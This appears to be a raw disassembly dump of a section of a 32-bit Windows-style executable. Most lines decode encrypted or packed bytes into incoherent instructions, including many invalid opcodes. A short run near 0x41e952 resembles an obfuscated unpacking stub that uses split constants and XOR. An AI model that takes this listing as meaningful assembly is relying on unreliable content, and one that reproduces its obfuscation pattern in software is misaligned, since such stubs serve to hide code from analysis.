  41e22c:	sub    ah,ah
  41e22e:	push   ecx
  41e22f:	jle    0x41e250
  41e231:	jecxz  0x41e289
  41e233:	outs   dx,BYTE PTR ds:[esi]
  41e234:	cld    
  41e235:	jecxz  0x41e214
  41e237:	xor    DWORD PTR [edx+0x72bd9deb],eax
  41e23d:	sub    dh,ah
  41e23f:	cs jns 0x41e289
  41e242:	fwait
  41e243:	daa    
  41e244:	dec    edx
  41e245:	add    eax,0x2024fbad
  41e24a:	mov    al,0xeb
  41e24c:	push   0xffffffc9
  41e24e:	inc    esi
  41e24f:	imul   eax,DWORD PTR [edi],0x5a
  41e252:	js     0x41e22d
  41e254:	(bad)  
  41e255:	in     eax,0x4c
  41e257:	jmp    0x41e1da
  41e259:	sti    
  41e25a:	daa    
  41e25b:	nop
  41e25c:	cmp    DWORD PTR [ecx+0x5],ebx
  41e25f:	push   ebx
  41e260:	xchg   esi,eax
  41e261:	sar    DWORD PTR [ebx],1
  41e263:	dec    ebx
  41e264:	repnz call 0xadcf:0xa8ae3cdb
  41e26c:	mov    ds:0x732ae44c,eax
  41e271:	xor    al,0x3e
  41e273:	adc    al,0x99
  41e275:	sbb    al,0x82
  41e277:	jmp    FWORD PTR [ebx]
  41e279:	das    
  41e27a:	mov    ecx,0xfd31875
  41e27f:	inc    ebp
  41e280:	sbb    cl,al
  41e282:	out    dx,al
  41e283:	ins    BYTE PTR es:[edi],dx
  41e284:	arpl   WORD PTR [ebx+0x7b],bp
  41e287:	ror    DWORD PTR [edi+0x3c7c53a],0x37
  41e28e:	lods   al,BYTE PTR ds:[esi]
  41e28f:	sub    al,0x20
  41e291:	mov    ch,0xe9
  41e293:	dec    edx
  41e294:	fistp  QWORD PTR [eax-0x707e52c9]
  41e29a:	mov    dh,0xd4
  41e29c:	cmp    dl,BYTE PTR [ebx+0xa]
  41e29f:	cmp    al,bl
  41e2a1:	jmp    0x7d249ee7
  41e2a6:	rol    cl,cl
  41e2a8:	shl    DWORD PTR [edx+0x759937d0],cl
  41e2ae:	cmc    
  41e2af:	pop    edi
  41e2b0:	fisub  WORD PTR [edi+0x711d89e8]
  41e2b6:	xchg   DWORD PTR [ebp-0x13286221],ebp
  41e2bc:	xchg   ebp,eax
  41e2bd:	lock pop esp
  41e2bf:	nop
  41e2c0:	sbb    BYTE PTR [ebp+edx*2-0x79b1b12b],0xd0
  41e2c8:	rol    DWORD PTR [edx+0x2eb2cec9],0x6
  41e2cf:	pop    ebp
  41e2d0:	mov    ds:0xb413164c,al
  41e2d5:	mov    eax,0x3858f560
  41e2da:	out    0x2,eax
  41e2dc:	pushf  
  41e2dd:	jo     0x41e273
  41e2df:	push   eax
  41e2e0:	cdq    
  41e2e1:	ins    DWORD PTR es:[edi],dx
  41e2e2:	(bad)  
  41e2e3:	pusha  
  41e2e4:	mov    ecx,0x2cd233d9
  41e2e9:	pusha  
  41e2ea:	repz mov ds:0x973c2c92,al
  41e2f0:	mov    bh,0xb4
  41e2f2:	rol    BYTE PTR [ebp-0x32],1
  41e2f5:	sti    
  41e2f6:	loop   0x41e321
  41e2f8:	out    0x4e,al
  41e2fa:	ret    0x9c2e
  41e2fd:	pusha  
  41e2fe:	scas   al,BYTE PTR es:[edi]
  41e2ff:	shl    ch,0xbe
  41e302:	ins    DWORD PTR es:[edi],dx
  41e303:	push   es
  41e304:	mov    dl,0xee
  41e306:	push   es
  41e307:	ds and cl,ah
  41e30a:	stc    
  41e30b:	inc    bh
  41e30d:	fst    DWORD PTR [ebp+0x63]
  41e310:	adc    ecx,ebx
  41e312:	in     al,0x9e
  41e314:	jo     0x41e31b
  41e316:	push   ebx
  41e317:	imul   esi,DWORD PTR [esi],0xf0147c14
  41e31d:	repnz outs dx,DWORD PTR ds:[esi]
  41e31f:	and    esi,edx
  41e321:	jbe    0x41e389
  41e323:	mov    dh,0x9b
  41e325:	sahf   
  41e326:	test   DWORD PTR [esi+0x7c],ecx
  41e329:	repz shr BYTE PTR [ebp+0x7951d402],0xf3
  41e331:	pop    ebp
  41e332:	push   es
  41e333:	fisub  DWORD PTR [edi+eiz*2-0x1d]
  41e337:	dec    eax
  41e338:	fisub  WORD PTR [ebx+0x79]
  41e33b:	arpl   WORD PTR [bp-0x205b],ax
  41e340:	in     al,0xd
  41e342:	test   eax,0x18d4e61d
  41e347:	scas   eax,DWORD PTR es:[edi]
  41e348:	mov    ecx,0xefaa7e22
  41e34d:	loope  0x41e38e
  41e34f:	dec    ebx
  41e350:	mov    al,0xf5
  41e352:	mov    dh,0x8
  41e354:	fxch   st(0)
  41e356:	fiadd  WORD PTR [edx-0x915478d]
  41e35c:	push   0xffffffd4
  41e35e:	test   eax,0xa9fa003a
  41e363:	pop    es
  41e364:	or     esp,edi
  41e366:	pop    edx
  41e367:	mov    cl,0xa6
  41e369:	cmp    DWORD PTR [ebx+0x32ee60a7],ecx
  41e36f:	addr16 xchg ecx,eax
  41e371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e372:	xchg   edi,eax
  41e373:	sar    BYTE PTR [esi],1
  41e375:	fimul  WORD PTR [ebx+eax*8+0x6e246c21]
  41e37c:	mov    esp,0x42ce5d35
  41e381:	mov    dh,0x8c
  41e383:	(bad)  
  41e385:	add    dl,BYTE PTR [edi-0x53a69d1e]
  41e38b:	lahf   
  41e38c:	stos   BYTE PTR es:[edi],al
  41e38d:	xchg   BYTE PTR [edx+eiz*4],cl
  41e390:	jg     0x41e3b9
  41e392:	sahf   
  41e393:	mov    al,ds:0xfb0a2d2
  41e398:	cmc    
  41e399:	jae    0x41e381
  41e39b:	retf   
  41e39c:	sti    
  41e39d:	xor    al,cl
  41e39f:	sbb    eax,0x37db8da7
  41e3a4:	std    
  41e3a5:	fwait
  41e3a6:	outs   dx,DWORD PTR ds:[esi]
  41e3a7:	lds    edx,FWORD PTR [ebx+0x77ff4680]
  41e3ad:	cwde   
  41e3ae:	pop    edi
  41e3af:	cmp    eax,0xc5606673
  41e3b4:	mov    ds:0x3680f7e8,eax
  41e3b9:	lods   al,BYTE PTR ds:[esi]
  41e3ba:	cmp    DWORD PTR [ebx+0x31],ebp
  41e3bd:	and    DWORD PTR [ecx],ebx
  41e3bf:	cmp    BYTE PTR [ebx],dh
  41e3c1:	aad    0x3b
  41e3c3:	in     eax,dx
  41e3c4:	fidivr WORD PTR [ecx+0x1b]
  41e3c7:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41e3c9:	int    0x79
  41e3cb:	out    dx,al
  41e3cc:	jg     0x41e423
  41e3ce:	or     ebx,DWORD PTR [ebx]
  41e3d0:	inc    ecx
  41e3d1:	daa    
  41e3d2:	push   0xffffff8d
  41e3d4:	fisttp DWORD PTR [edx+eax*2+0x528316b4]
  41e3db:	mov    cl,0xbd
  41e3dd:	outs   dx,BYTE PTR ds:[esi]
  41e3de:	inc    ecx
  41e3df:	out    0xaa,al
  41e3e1:	inc    esp
  41e3e2:	push   ebx
  41e3e3:	jno    0x41e3d8
  41e3e5:	(bad)  
  41e3e6:	mov    esi,0x61554746
  41e3eb:	xor    eax,esp
  41e3ed:	scas   eax,DWORD PTR es:[edi]
  41e3ee:	push   ecx
  41e3ef:	stos   DWORD PTR es:[edi],eax
  41e3f0:	nop
  41e3f1:	sub    DWORD PTR [edx-0x13],edx
  41e3f4:	in     al,0xe5
  41e3f6:	xchg   esp,eax
  41e3f7:	adc    eax,DWORD PTR [ebx]
  41e3f9:	xchg   ebp,eax
  41e3fa:	test   eax,0xed906653
  41e3ff:	add    edx,DWORD PTR [eax]
  41e401:	lds    ecx,FWORD PTR [edx]
  41e403:	jl     0x41e418
  41e405:	add    eax,0x5b782623
  41e40a:	push   edx
  41e40b:	sar    BYTE PTR [edx],0x93
  41e40e:	in     eax,0xd2
  41e410:	enter  0x9f08,0x3a
  41e414:	sub    DWORD PTR [eax],edx
  41e416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e417:	jmp    0x41e3d4
  41e419:	mov    ecx,0x3c7a62e1
  41e41e:	lahf   
  41e41f:	xor    BYTE PTR [edi-0x30f87041],ah
  41e425:	cmp    esi,DWORD PTR [ebp-0x6fbbb2bf]
  41e42b:	test   DWORD PTR [eax+ecx*4-0x2c],ebp
  41e42f:	push   ds
  41e430:	out    dx,al
  41e431:	push   edi
  41e432:	std    
  41e433:	mov    BYTE PTR [edx-0x9d563b7],dh
  41e439:	or     ch,bl
  41e43b:	cmp    al,BYTE PTR [ebp+0x13063631]
  41e441:	call   0xa13c:0xf3a97f05
  41e448:	cmc    
  41e449:	inc    edi
  41e44a:	mov    edx,0x94df34cb
  41e44f:	cld    
  41e450:	jo     0x41e43d
  41e452:	push   ebx
  41e453:	shl    BYTE PTR [ecx],0x72
  41e456:	mov    bh,0xd8
  41e458:	sub    DWORD PTR [eax+0x72256753],eax
  41e45e:	fadd   QWORD PTR [edx+0x19eb7ba3]
  41e464:	retf   
  41e465:	ret    
  41e466:	push   ebx
  41e467:	fstp   DWORD PTR [ecx+0x456723b3]
  41e46d:	cmp    dl,BYTE PTR [ecx-0x67]
  41e470:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e472:	lock or al,0x3
  41e475:	sti    
  41e476:	out    0x8e,eax
  41e478:	and    eax,0xeea88bdf
  41e47d:	xor    ecx,DWORD PTR [esi]
  41e47f:	call   FWORD PTR [esi+0x1c5cf36a]
  41e485:	inc    ebx
  41e486:	bound  edx,QWORD PTR [eax]
  41e488:	dec    edx
  41e489:	and    ch,BYTE PTR [ecx]
  41e48b:	lahf   
  41e48c:	lods   al,BYTE PTR ds:[esi]
  41e48d:	fild   QWORD PTR [ebx]
  41e48f:	pop    ebp
  41e490:	adc    eax,DWORD PTR [ebp+0x1e437f83]
  41e496:	inc    ebp
  41e497:	je     0x41e46b
  41e499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e49a:	adc    ch,BYTE PTR [esi+0x24]
  41e49d:	daa    
  41e49e:	jmp    0x23978765
  41e4a3:	daa    
  41e4a4:	(bad)  
  41e4a5:	scas   al,BYTE PTR es:[edi]
  41e4a6:	and    esi,DWORD PTR [eax+0x45]
  41e4a9:	loope  0x41e51a
  41e4ab:	sbb    al,0xea
  41e4ad:	pushf  
  41e4ae:	rol    BYTE PTR [esp+ebx*4+0x6d050d9d],cl
  41e4b5:	dec    DWORD PTR [ebx+0x22]
  41e4b8:	mov    edi,0x6de4d575
  41e4bd:	sbb    al,0x32
  41e4bf:	pusha  
  41e4c0:	imul   edi,DWORD PTR [ecx+0x3857cf46],0x6f
  41e4c7:	cmp    al,0x9c
  41e4c9:	and    cl,bh
  41e4cb:	fidivr WORD PTR [eax+0x67477bc]
  41e4d1:	dec    edi
  41e4d2:	(bad)  
  41e4d3:	test   eax,0x93be533d
  41e4d8:	lds    edi,FWORD PTR [edx-0x46]
  41e4db:	stos   DWORD PTR es:[edi],eax
  41e4dc:	lods   eax,DWORD PTR ds:[esi]
  41e4dd:	(bad)  
  41e4de:	pusha  
  41e4df:	mov    ebx,0xe234df4b
  41e4e4:	push   ebp
  41e4e5:	out    dx,al
  41e4e6:	add    BYTE PTR [eax+0x2253e229],0xc8
  41e4ed:	lds    eax,FWORD PTR [edi-0x6b]
  41e4f0:	clc    
  41e4f1:	fisub  DWORD PTR [edx-0x6ed5c544]
  41e4f7:	data16 add BYTE PTR [eax],dh
  41e4fa:	int    0x7e
  41e4fc:	or     dl,BYTE PTR [eax]
  41e4fe:	cwde   
  41e4ff:	pop    ebx
  41e500:	xchg   BYTE PTR [edi+0x68a2d718],dh
  41e506:	pop    edi
  41e507:	sbb    BYTE PTR ds:0xd8d3de85,dh
  41e50d:	xchg   BYTE PTR [eax-0x30463ca5],cl
  41e513:	lea    esp,[eax-0x6c]
  41e516:	adc    eax,0xc4aea950
  41e51b:	scas   eax,DWORD PTR es:[edi]
  41e51c:	adc    al,0x86
  41e51e:	out    0xad,eax
  41e520:	(bad)  
  41e522:	sub    edx,DWORD PTR [ecx+0x60]
  41e525:	mov    ebx,0xc5531c64
  41e52a:	rol    BYTE PTR [eax-0x399a1ba6],0xfa
  41e531:	daa    
  41e532:	pop    es
  41e533:	fisubr DWORD PTR [esi-0x6b]
  41e536:	xlat   BYTE PTR ds:[ebx]
  41e537:	out    dx,al
  41e538:	pop    ebp
  41e539:	mov    dl,bl
  41e53b:	imul   ebx,DWORD PTR [esi],0xffffffa3
  41e53e:	in     al,dx
  41e53f:	push   edx
  41e540:	in     al,0x7e
  41e542:	inc    ebp
  41e543:	fwait
  41e544:	mov    cl,0x8b
  41e546:	mov    cl,0xac
  41e548:	hlt    
  41e549:	jecxz  0x41e515
  41e54b:	xchg   esp,eax
  41e54c:	dec    ecx
  41e54d:	jg     0x41e56a
  41e54f:	pop    esp
  41e550:	adc    eax,0x64d0672d
  41e555:	in     al,dx
  41e556:	jmp    0x67fe:0xaa5a2ea7
  41e55d:	jl     0x41e5b1
  41e55f:	cmp    cl,BYTE PTR [esi]
  41e561:	xor    al,0x9f
  41e563:	xchg   BYTE PTR [ecx+edi*2+0x23],al
  41e567:	dec    edi
  41e568:	jecxz  0x41e53b
  41e56a:	inc    esi
  41e56b:	xor    BYTE PTR [esi+0x729da59e],cl
  41e571:	dec    BYTE PTR [edi-0x25a114d2]
  41e577:	addr16 mov ds:0xa848,eax
  41e57b:	push   ds
  41e57c:	in     al,dx
  41e57d:	lea    ebp,[edx+ebx*4-0xf750924]
  41e584:	xlat   BYTE PTR gs:[ebx]
  41e586:	and    BYTE PTR [edi+0x708fc115],ch
  41e58c:	mov    al,BYTE PTR [edx+ebp*2]
  41e58f:	xlat   BYTE PTR ds:[ebx]
  41e590:	arpl   si,cx
  41e592:	inc    eax
  41e593:	mov    dl,0x9a
  41e595:	idiv   BYTE PTR [ecx]
  41e597:	xor    DWORD PTR [ecx-0x6],0xffffff82
  41e59b:	paddq  mm6,QWORD PTR [ecx]
  41e59e:	pushf  
  41e59f:	daa    
  41e5a0:	or     bl,bh
  41e5a2:	dec    ecx
  41e5a3:	sbb    ebx,edi
  41e5a5:	scas   al,BYTE PTR es:[edi]
  41e5a6:	loope  0x41e5d4
  41e5a8:	enter  0x7bff,0x6a
  41e5ac:	ror    BYTE PTR [edi-0xcae8f88],cl
  41e5b2:	popa   
  41e5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5b4:	int    0xbf
  41e5b6:	stos   DWORD PTR es:[edi],eax
  41e5b7:	mov    BYTE PTR [edx+eiz*4-0x49],al
  41e5bb:	stos   BYTE PTR es:[edi],al
  41e5bc:	xchg   ebx,eax
  41e5bd:	(bad)  
  41e5bf:	xor    cl,dh
  41e5c1:	loopne 0x41e5bf
  41e5c3:	lds    ebp,FWORD PTR [ebx-0x1244aae]
  41e5c9:	push   ds
  41e5ca:	add    al,0x40
  41e5cc:	mov    esi,0x1de422c6
  41e5d1:	jnp    0x41e60e
  41e5d3:	sahf   
  41e5d4:	mov    WORD PTR ds:0x2d0a2afe,bp
  41e5db:	fsub   st,st(2)
  41e5dd:	retf   
  41e5de:	loopne 0x41e572
  41e5e0:	sub    BYTE PTR [ebx+0x7f],bl
  41e5e3:	push   cs
  41e5e4:	ss repz cwde 
  41e5e7:	pextrw edi,(bad),0xc5
  41e5e9:	mov    esi,0xa890f6b3
  41e5ee:	sar    edi,1
  41e5f0:	std    
  41e5f1:	pop    ecx
  41e5f2:	push   eax
  41e5f3:	pop    eax
  41e5f4:	and    eax,0x14be966a
  41e5f9:	add    ch,ch
  41e5fb:	jbe    0x41e669
  41e5fd:	aaa    
  41e5fe:	dec    edx
  41e5ff:	xor    al,0x17
  41e601:	lock ins BYTE PTR es:[edi],dx
  41e603:	jbe    0x41e65e
  41e605:	fmul   QWORD PTR [edx-0x4af22c7e]
  41e60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e60c:	cmovbe ebx,DWORD PTR [esi]
  41e60f:	aam    0xd5
  41e611:	pop    ebx
  41e612:	or     eax,0xe79f038b
  41e617:	cmp    eax,0x48788b1f
  41e61c:	inc    edx
  41e61d:	and    edi,eax
  41e61f:	xchg   ebx,eax
  41e620:	adc    ecx,DWORD PTR [esi+0x1e]
  41e623:	ret    0xb862
  41e626:	lahf   
  41e627:	xor    ah,al
  41e629:	inc    DWORD PTR [eax+0x50]
  41e62c:	cwde   
  41e62d:	ins    BYTE PTR es:[edi],dx
  41e62e:	inc    BYTE PTR [eax]
  41e630:	out    0xe2,eax
  41e632:	aas    
  41e633:	xor    al,0x65
  41e635:	cmc    
  41e636:	je     0x41e61f
  41e638:	push   esi
  41e639:	xadd   DWORD PTR [esi+0x3851f1fd],edi
  41e640:	mov    DWORD PTR [esi],ebx
  41e642:	es ja  0x41e6af
  41e645:	sub    al,0x33
  41e647:	dec    ebx
  41e648:	in     al,dx
  41e649:	or     esp,0x607c5159
  41e64f:	aas    
  41e650:	repnz dec edi
  41e652:	xlat   BYTE PTR ds:[ebx]
  41e653:	pop    ds
  41e654:	nop
  41e655:	aam    0xe9
  41e657:	rol    ebp,1
  41e659:	out    dx,eax
  41e65a:	aad    0x9
  41e65c:	or     al,0x74
  41e65e:	mov    DWORD PTR ds:0x3b155291,edx
  41e664:	mov    esi,0x6d41099c
  41e669:	shr    DWORD PTR [edx+0x74],cl
  41e66c:	mov    al,ds:0x49e713c1
  41e671:	out    0x2d,al
  41e673:	loop   0x41e60c
  41e675:	sub    DWORD PTR ds:0x782a0600,0x67
  41e67c:	jp     0x41e667
  41e67e:	outs   dx,DWORD PTR ds:[esi]
  41e67f:	cmp    ch,BYTE PTR [edi-0x3b79c3ab]
  41e685:	gs sub al,0xcc
  41e688:	call   0xa521:0xf18201ca
  41e68f:	jg     0x41e643
  41e691:	out    dx,eax
  41e692:	pop    ds
  41e693:	adc    al,ah
  41e695:	jb     0x41e6bf
  41e697:	mov    esi,0xd8f9b82e
  41e69c:	and    DWORD PTR [edx+0x7ad8a947],edx
  41e6a2:	rol    edx,cl
  41e6a4:	jmp    0x1c442e5a
  41e6a9:	jmp    0x91d9:0xff3a4c32
  41e6b0:	inc    edi
  41e6b1:	add    bl,BYTE PTR [eax+0x4602a6bd]
  41e6b7:	mov    ebp,0xd09dbb1f
  41e6bc:	mov    edi,0x55f8f147
  41e6c1:	and    al,0x1a
  41e6c3:	inc    ebp
  41e6c4:	xchg   edi,eax
  41e6c5:	add    BYTE PTR [edi],dl
  41e6c7:	jmp    0x41e72c
  41e6c9:	(bad)  
  41e6ca:	mov    cl,0x4
  41e6cc:	cdq    
  41e6cd:	lahf   
  41e6ce:	pop    ecx
  41e6cf:	pop    esi
  41e6d0:	push   esi
  41e6d1:	cld    
  41e6d2:	fwait
  41e6d3:	aam    0x6f
  41e6d5:	cdq    
  41e6d6:	div    ecx
  41e6d8:	push   0xe
  41e6da:	daa    
  41e6db:	cmp    eax,0x483cd298
  41e6e0:	jb     0x41e6ce
  41e6e2:	sbb    al,0xe4
  41e6e4:	icebp  
  41e6e5:	in     al,dx
  41e6e6:	jo     0x41e6cc
  41e6e8:	sbb    eax,0x3055d9e8
  41e6ed:	adc    esi,DWORD PTR [edi-0x4b0063f1]
  41e6f3:	les    edx,FWORD PTR [ebp-0x1a]
  41e6f6:	js     0x41e6e2
  41e6f8:	mov    ?,WORD PTR [esi-0x5087cbb8]
  41e6fe:	adc    eax,DWORD PTR [ecx]
  41e700:	pop    ds
  41e701:	dec    edx
  41e702:	dec    esi
  41e703:	or     al,0x97
  41e705:	pop    edi
  41e706:	ficom  WORD PTR [ecx-0x7202bcef]
  41e70c:	or     ebx,ebx
  41e70e:	aaa    
  41e70f:	scas   eax,DWORD PTR es:[edi]
  41e710:	dec    ebx
  41e711:	xchg   DWORD PTR [esi+eiz*2-0x5fa10e62],esi
  41e718:	inc    ebx
  41e719:	adc    al,0xc9
  41e71b:	sub    ecx,eax
  41e71d:	mov    eax,ds:0x42b10a9d
  41e722:	mov    esi,DWORD PTR [ecx-0x43]
  41e725:	xlat   BYTE PTR ds:[ebx]
  41e726:	cdq    
  41e727:	stos   DWORD PTR es:[edi],eax
  41e728:	xchg   ebp,eax
  41e729:	call   0x36208443
  41e72e:	sub    eax,0xd0435808
  41e733:	mov    ecx,0x85702745
  41e738:	push   esp
  41e739:	hlt    
  41e73a:	pop    ebp
  41e73b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e73c:	inc    ebp
  41e73d:	adc    al,0xf2
  41e73f:	pop    ss
  41e740:	(bad)  
  41e741:	in     eax,dx
  41e742:	stos   BYTE PTR es:[edi],al
  41e743:	retf   0x46ee
  41e746:	cmp    esp,0xc106255d
  41e74c:	xchg   edx,eax
  41e74d:	push   0x57d00d3e
  41e752:	xchg   ebp,eax
  41e753:	mov    eax,ds:0xf217f114
  41e758:	adc    eax,0x61b338a8
  41e75d:	pusha  
  41e75e:	mov    al,ds:0xdefd9f92
  41e763:	jno    0x41e795
  41e765:	inc    esi
  41e766:	lods   al,BYTE PTR ds:[esi]
  41e767:	dec    ecx
  41e768:	jmp    0xc8d7:0x778f3eb2
  41e76f:	(bad)  
  41e770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e771:	test   BYTE PTR [esi+0x492d771b],al
  41e777:	jge    0x41e782
  41e779:	pop    ss
  41e77a:	inc    edi
  41e77b:	jmp    0x17b8:0xa93e9cbb
  41e782:	mov    WORD PTR [ecx+esi*1+0x31],fs
  41e786:	lahf   
  41e787:	loope  0x41e761
  41e789:	or     eax,0xeedeabcc
  41e78e:	int3   
  41e78f:	push   es
  41e790:	xor    DWORD PTR [eax+0x1d8628b4],edx
  41e796:	jae    0x41e71a
  41e798:	test   DWORD PTR [ebx-0x43],edi
  41e79b:	cmp    eax,0xd076c7a3
  41e7a0:	pop    eax
  41e7a1:	adc    edi,DWORD PTR [edi+0x19]
  41e7a4:	jbe    0x41e743
  41e7a6:	jl     0x41e7d6
  41e7a8:	adc    cl,BYTE PTR [edx-0x54]
  41e7ab:	xchg   DWORD PTR [edx+0xd],esp
  41e7ae:	cmp    eax,0xaf1c325d
  41e7b3:	jae    0x41e7db
  41e7b5:	mov    dh,0x9
  41e7b7:	cdq    
  41e7b8:	arpl   dx,bp
  41e7ba:	cmc    
  41e7bb:	dec    ecx
  41e7bc:	xor    bh,ah
  41e7be:	lods   al,BYTE PTR ds:[esi]
  41e7bf:	sbb    al,0x0
  41e7c1:	popa   
  41e7c2:	xchg   esp,eax
  41e7c3:	fiadd  DWORD PTR [edx]
  41e7c5:	jmp    0x4392:0xac56f64c
  41e7cc:	inc    ecx
  41e7cd:	mov    bh,BYTE PTR [esi]
  41e7cf:	retf   
  41e7d0:	mov    ah,0xab
  41e7d2:	push   0xffffffbc
  41e7d4:	shr    ebp,cl
  41e7d6:	neg    DWORD PTR [esi+0x6a]
  41e7d9:	mov    DWORD PTR [ebx+0x6e166c23],0x329ba60c
  41e7e3:	pop    eax
  41e7e4:	inc    esp
  41e7e5:	leave  
  41e7e6:	push   ebx
  41e7e7:	mov    ebx,0x975fd71e
  41e7ec:	aad    0x43
  41e7ee:	imul   eax,DWORD PTR [ebx+ecx*2],0x4ef814f8
  41e7f5:	jle    0x41e7a9
  41e7f7:	loope  0x41e798
  41e7f9:	pusha  
  41e7fa:	xor    BYTE PTR [edx-0x681ace2f],dh
  41e800:	ret    
  41e801:	pop    ds
  41e802:	adc    edx,DWORD PTR [ecx+0x13de7a28]
  41e808:	and    al,0xf6
  41e80a:	mov    esp,0x3d092294
  41e80f:	cs mov cl,0xf2
  41e812:	daa    
  41e813:	pop    es
  41e814:	adc    al,0xe6
  41e816:	shl    BYTE PTR [edi-0x81ad044],cl
  41e81c:	sar    DWORD PTR [eax+0x36],0xea
  41e820:	in     al,dx
  41e821:	xchg   esi,eax
  41e822:	push   ebp
  41e823:	dec    ebx
  41e824:	das    
  41e825:	jle    0x41e7d2
  41e827:	inc    esp
  41e828:	dec    eax
  41e829:	hlt    
  41e82a:	gs ds mov cl,0xe7
  41e82e:	call   0xfe625818
  41e833:	fistp  WORD PTR [eax+ebp*2]
  41e836:	aas    
  41e837:	iret   
  41e838:	ficom  WORD PTR [ebp+ecx*4-0x7b]
  41e83c:	retf   0xce79
  41e83f:	push   edx
  41e840:	mov    ecx,0x51067eca
  41e845:	loop   0x41e895
  41e847:	or     DWORD PTR [eax],ecx
  41e849:	sub    al,0x26
  41e84b:	add    al,0xce
  41e84d:	ins    DWORD PTR es:[edi],dx
  41e84e:	or     eax,0xd7ec174c
  41e853:	push   ebp
  41e854:	sti    
  41e855:	(bad)  
  41e856:	scas   eax,DWORD PTR es:[edi]
  41e857:	xchg   dl,bh
  41e859:	sub    eax,0xbf61e5e9
  41e85e:	sbb    eax,0xb6705172
  41e863:	jbe    0x41e840
  41e865:	or     al,ch
  41e867:	call   0xe848b5a2
  41e86c:	sub    eax,0xd417c31b
  41e871:	and    eax,0xa9af62fe
  41e876:	dec    ebp
  41e877:	outs   dx,BYTE PTR ds:[esi]
  41e878:	pop    esi
  41e879:	sub    al,0x78
  41e87b:	push   edi
  41e87c:	call   0x8af50a24
  41e881:	dec    ebp
  41e882:	mov    gs,esi
  41e884:	loope  0x41e8c6
  41e886:	lock xlat BYTE PTR ds:[ebx]
  41e888:	gs or  al,0xac
  41e88b:	and    al,0x1c
  41e88d:	loope  0x41e89e
  41e88f:	fdivrp st(3),st
  41e891:	cmp    ch,BYTE PTR [ecx+ebx*1]
  41e894:	mov    ebp,0x39e76a4f
  41e899:	rcr    DWORD PTR [ebp+0x50],cl
  41e89c:	loope  0x41e8ea
  41e89e:	jl     0x41e8e7
  41e8a0:	arpl   WORD PTR [eax-0x80],dx
  41e8a3:	add    ah,BYTE PTR [edx-0x47]
  41e8a6:	mov    ecx,DWORD PTR [eax-0x653c4da4]
  41e8ac:	cmp    BYTE PTR [edx-0x78],dh
  41e8af:	cli    
  41e8b0:	jnp    0x41e8f1
  41e8b2:	or     eax,0xbaa048e8
  41e8b7:	out    0xac,al
  41e8b9:	sbb    esp,DWORD PTR [esi]
  41e8bb:	push   ebp
  41e8bc:	sub    DWORD PTR [esi+0x78dda26],0xffffff98
  41e8c3:	or     eax,0xd0569c2b
  41e8c8:	ret    0xd547
  41e8cb:	sbb    al,0xcb
  41e8cd:	cs inc ebx
  41e8cf:	cmp    DWORD PTR [ebp+0x22],eax
  41e8d2:	xlat   BYTE PTR ds:[ebx]
  41e8d3:	pop    ebp
  41e8d4:	nop
  41e8d5:	outs   dx,DWORD PTR ds:[esi]
  41e8d6:	cld    
  41e8d7:	in     al,0x6c
  41e8d9:	out    dx,eax
  41e8da:	mov    DWORD PTR [edi+eax*4],ecx
  41e8dd:	push   ds
  41e8de:	dec    ebp
  41e8df:	cmp    al,0xcc
  41e8e1:	sbb    ebx,DWORD PTR [ebx]
  41e8e3:	cs (bad) 
  41e8e5:	fsub   QWORD PTR [ecx]
  41e8e7:	popa   
  41e8e8:	pusha  
  41e8e9:	inc    ecx
  41e8ea:	or     DWORD PTR [ebp-0x5b],ebx
  41e8ed:	dec    edx
  41e8ee:	sub    bh,bh
  41e8f0:	bound  ebp,QWORD PTR [ebx-0x30942c3d]
  41e8f6:	pop    ds
  41e8f7:	sub    al,BYTE PTR [ebx+0x64bd62a9]
  41e8fd:	xchg   edi,eax
  41e8fe:	call   0xa1333eb1
  41e903:	pop    edx
  41e904:	mov    ah,0x7c
  41e906:	pop    ebx
  41e907:	cmp    al,0x81
  41e909:	call   0xa6675fc7
  41e90e:	sahf   
  41e90f:	gs xchg esp,eax
  41e911:	sub    dl,dh
  41e913:	mov    dh,0x7b
  41e915:	mov    bh,0x99
  41e917:	imul   ecx,DWORD PTR [ebp+0x59],0xffffff91
  41e91b:	xchg   BYTE PTR [ebx-0x513a881b],bl
  41e921:	jno    0x41e911
  41e923:	imul   edx,DWORD PTR [edx],0x3dbb383
  41e929:	mov    edi,0xa51aba21
  41e92e:	mov    dh,0xc2
  41e930:	inc    edx
  41e931:	sub    al,0xa1
  41e933:	xchg   edx,eax
  41e934:	pop    eax
  41e935:	add    bl,bh
  41e937:	jmp    0x41e919
  41e939:	lea    edx,[edx+0x69]
  41e93c:	push   ebx
  41e93d:	push   0xbdfb9994
  41e942:	fldcw  WORD PTR ds:0xa4fa9153
  41e948:	aaa    
  41e949:	cmc    
  41e94a:	xchg   esp,eax
  41e94b:	mov    WORD PTR [ebx],?
  41e94d:	rol    BYTE PTR [ebx],1
  41e94f:	into   
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fstp DWORD PTR es:[eax-0x712ba433]
  41e99f:	ret    0x7a7d
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41e9e1
  41e9a7:	je     0x41e996
